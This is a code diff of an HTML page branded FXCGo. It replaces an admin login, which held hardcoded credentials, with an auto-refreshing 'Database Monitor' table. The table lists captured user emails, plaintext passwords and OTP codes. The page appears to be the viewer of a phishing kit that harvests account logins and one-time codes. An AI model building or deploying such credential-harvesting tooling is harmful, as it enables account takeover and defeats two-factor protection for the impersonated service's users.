@@ -2,100 +2,21 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta http-equiv="refresh" content="3"> <!-- Refresh every 3 seconds -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FXCGo – Admin Panel</title>
+<title>FXCGo – Database Monitor</title>
 
 <style>
     body {
-        font-family: "Poppins", sans-serif;
-        background: #dde6ef;
+        font-family: Arial, sans-serif;
+        background: #eef3f8;
         margin: 0;
         padding: 20px;
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
     }
-
-    .login-container {
-        background: white;
-        padding: 40px;
-        border-radius: 15px;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-        width: 100%;
-        max-width: 400px;
-        text-align: center;
-    }
-
-    .logo {
-        font-size: 34px;
-        font-weight: bold;
-        margin-bottom: 10px;
-        display: flex;
-        justify-content: center;
-        gap: 6px;
-    }
-
-    .logo span:nth-child(1) { color: #72d9fd; }
-    .logo span:nth-child(2) { color: #ffcf66; }
-    .logo span:nth-child(3) { color: #ff7fa4; }
-    .logo span:nth-child(4) { color: #84eb85; }
 
     h1 {
+        text-align: center;
         color: #0037d1;
-        margin: 20px 0;
-        font-size: 24px;
-    }
-
-    .input-box {
-        width: 100%;
-        padding: 12px 15px;
-        margin: 10px 0;
-        border: 1px solid #cdd6e4;
-        border-radius: 25px;
-        font-size: 15px;
-        outline: none;
-    }
-
-    .login-btn {
-        width: 100%;
-        background: #0047ff;
-        color: white;
-        border: none;
-        padding: 12px;
-        border-radius: 25px;
-        font-size: 16px;
-        margin-top: 15px;
-        cursor: pointer;
-        transition: background 0.3s;
-    }
-
-    .login-btn:hover {
-        background: #0037d1;
-    }
-
-    .admin-panel {
-        display: none;
-        width: 100%;
-        max-width: 1200px;
-    }
-
-    .admin-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        margin-bottom: 20px;
-    }
-
-    .logout-btn {
-        background: #ff4444;
-        color: white;
-        border: none;
-        padding: 8px 15px;
-        border-radius: 15px;
-        cursor: pointer;
-        font-size: 14px;
     }
 
     table {
@@ -104,55 +25,36 @@
         background: white;
         border-radius: 10px;
         overflow: hidden;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
     }
 
     th, td {
-        padding: 12px 15px;
-        border-bottom: 1px solid #e0e6ed;
+        padding: 12px;
+        border-bottom: 1px solid #ccc;
         text-align: left;
-        font-size: 14px;
+        font-size: 15px;
     }
 
     th {
         background: #0047ff;
         color: white;
-        font-weight: 500;
+        font-size: 16px;
     }
 
     tr:hover {
-        background: #f8fafc;
+        background: #f2f7ff;
     }
 
     .empty {
         text-align: center;
         padding: 30px;
-        font-size: 16px;
-        color: #6c757d;
+        font-size: 18px;
+        color: #777;
     }
 </style>
 </head>
 <body>
 
-<!-- Login Form -->
-<div id="loginForm" class="login-container">
-    <div class="logo">
-        <span>F</span><span>X</span><span>C</span><span>go</span>
-    </div>
-    <div style="color: #6f7d90; margin-bottom: 20px;">Admin Panel</div>
-    
-    <input type="text" id="adminUsername" class="input-box" placeholder="Admin Username" required>
-    <input type="password" id="adminPassword" class="input-box" placeholder="Password" required>
-    <button class="login-btn" onclick="adminLogin()">Login</button>
-    <p id="loginError" style="color: #ff4444; margin-top: 15px; display: none;">Invalid credentials</p>
-</div>
-
-<!-- Admin Panel (initially hidden) -->
-<div id="adminPanel" class="admin-panel">
-    <div class="admin-header">
-        <h1>User Data Records</h1>
-        <button class="logout-btn" onclick="adminLogout()">Logout</button>
-    </div>
+<h1>Stored User Data (Auto-Refresh Every 3 Seconds)</h1>
 
 <table>
     <thead>
@@ -160,7 +62,7 @@
             <th>#</th>
             <th>Email / Username</th>
             <th>Password</th>
-            <th>Last 3 OTPs</th>
+            <th>OTP Code</th>
             <th>Timestamp</th>
         </tr>
     </thead>
@@ -184,101 +86,11 @@
                     <td>${index + 1}</td>
                     <td>${item.email}</td>
                     <td>${item.password}</td>
-                    <td>${(item.otps && item.otps.length > 0) ? 
-                        item.otps.slice(-3).reverse().map(otp => otp.code).join(' • ') : 
-                        (item.otp ? item.otp : '-')}</td>
+                    <td>${item.otp || "-"}</td>
                     <td>${item.time}</td>
                 </tr>
             `;
         });
-    }
-</script>
-
-    <p style="text-align: center; color: #6f7d90; margin-top: 20px;">Auto-refreshing data...</p>
-</div>
-
-<script>
-    // Admin credentials (in a real app, this should be handled server-side)
-    const ADMIN_CREDENTIALS = {
-        username: 'admin',
-        password: 'admin123' // In a real app, use proper authentication
-    };
-
-    // Check if admin is already logged in
-    document.addEventListener('DOMContentLoaded', function() {
-        if (localStorage.getItem('adminLoggedIn') === 'true') {
-            showAdminPanel();
-        }
-    });
-
-    // Admin login function
-    function adminLogin() {
-        const username = document.getElementById('adminUsername').value;
-        const password = document.getElementById('adminPassword').value;
-        
-        if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
-            localStorage.setItem('adminLoggedIn', 'true');
-            showAdminPanel();
-        } else {
-            document.getElementById('loginError').style.display = 'block';
-        }
-    }
-
-    // Admin logout function
-    function adminLogout() {
-        localStorage.removeItem('adminLoggedIn');
-        location.reload();
-    }
-
-    // Show admin panel and load data
-    function showAdminPanel() {
-        document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('adminPanel').style.display = 'block';
-        loadData();
-        // Refresh data every 5 seconds
-        setInterval(loadData, 5000);
-    }
-
-    // Load and display data
-    function loadData() {
-        const records = JSON.parse(localStorage.getItem("fxcgo_data")) || [];
-        const tableBody = document.getElementById("data-body");
-
-        if (records.length === 0) {
-            tableBody.innerHTML = `<tr><td colspan="5" class="empty">No user data found.</td></tr>`;
-        } else {
-            tableBody.innerHTML = "";
-            records.forEach((item, index) => {
-                // Format OTPs
-                let otpsHtml = "-";
-                if (item.otps && item.otps.length > 0) {
-                    const recentOtps = item.otps.slice(-3).reverse();
-                    otpsHtml = recentOtps.map(otp => 
-                        `<div style="margin: 3px 0;">
-                            <strong>${otp.code}</strong> 
-                            <small style="color: #6c757d;">(${otp.action || 'verify'})</small>
-                            <br><small>${otp.time || ''}</small>
-                        </div>`
-                    ).join('');
-                    
-                    if (item.otps.length > 3) {
-                        otpsHtml += `<div style="margin-top: 5px; color: #6c757d; font-size: 12px;">
-                            +${item.otps.length - 3} more OTPs
-                        </div>`;
-                    }
-                }
-
-                tableBody.innerHTML += `
-                    <tr>
-                        <td>${index + 1}</td>
-                        <td>${item.email || '-'}</td>
-                        <td>${item.password || '-'}</td>
-                        <td>${otpsHtml}</td>
-                        <td>${item.time || '-'}</td>
-                    </tr>
-                `;
-            });
-        }
     }
 </script>
 
